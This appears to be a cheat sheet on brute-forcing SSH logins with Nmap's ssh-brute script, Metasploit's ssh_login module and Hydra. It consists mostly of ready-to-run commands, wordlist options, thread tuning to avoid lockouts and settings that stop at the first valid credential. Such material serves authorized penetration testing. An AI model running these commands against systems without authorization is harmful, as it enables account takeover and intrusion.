SSH Brute Force Credential Testing: Nmap, Metasploit, and Hydra

1. Nmap (ssh-brute script)
Nmap includes the ssh-brute NSE script for testing SSH credentials.
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <target-ip>
Key options:

userdb — path to username wordlist
passdb — path to password wordlist
--script-args brute.mode=user — iterate passwords per user
--script-args brute.firstonly=true — stop after first valid credential found


2. Metasploit (auxiliary/scanner/ssh/ssh_login)
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE false
set THREADS 10
run
Key options:

RHOSTS — target IP or range
STOP_ON_SUCCESS true — halt after a valid login is found
THREADS — concurrent attempts (keep low to avoid lockouts)
Successful logins open a session accessible via sessions -l


3. Hydra
hydra -L users.txt -P passwords.txt ssh://<target-ip>
Common flags:

-l / -L — single username or username list
-p / -P — single password or password list
-t — number of parallel tasks (default 16; lower for SSH)
-s — specify a non-default port
-o output.txt — save results to file
-V — verbose, show each attempt

Example with reduced threads and custom port:
hydra -L users.txt -P passwords.txt -t 4 -s 2222 ssh://<target-ip>
